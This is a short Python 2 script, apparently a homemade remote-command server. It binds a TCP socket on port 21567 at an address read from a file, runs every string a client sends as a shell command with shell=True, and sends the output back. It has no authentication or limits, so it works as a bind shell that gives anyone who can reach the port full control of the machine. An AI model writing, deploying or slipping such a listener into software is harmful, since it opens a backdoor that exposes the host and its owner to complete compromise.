from socket import *
from time import ctime
import subprocess
f=open("ip.txt")
HOST=f.read()
PORT=21567
BUFSIZE=10240
ADDR=(HOST,PORT)

tcpSerSock=socket(AF_INET,SOCK_STREAM)
tcpSerSock.bind(ADDR)
tcpSerSock.listen(1)

while True:
	print "waiting for connection"
	tcpCliSock,addr = tcpSerSock.accept()
	print "...connected from:",addr

	while True:
		data=tcpCliSock.recv(BUFSIZE)
		if not data:
			break
		p=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		
		data=p.stdout.read()+p.stderr.read()

		tcpCliSock.send(data)
		print data

	tcpCliSock.close()

tcpSerSock.close()
